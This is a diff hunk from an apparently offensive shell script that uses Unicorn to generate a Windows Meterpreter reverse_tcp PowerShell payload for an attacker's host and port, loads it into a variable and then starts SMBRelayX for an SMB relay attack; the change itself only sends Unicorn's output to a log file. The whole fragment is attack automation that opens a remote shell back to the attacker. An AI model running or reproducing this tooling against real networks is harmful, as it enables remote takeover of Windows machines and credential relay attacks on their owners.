@@ -167,7 +167,7 @@ fi
 
 echo "Generating Payload..."
 spinner
-python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport 2>&1
+python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport >> relayer.log
 payload=$(cat powershell_attack.txt)
 echo "Payload created"
 echo "Starting SMBRelayX..."
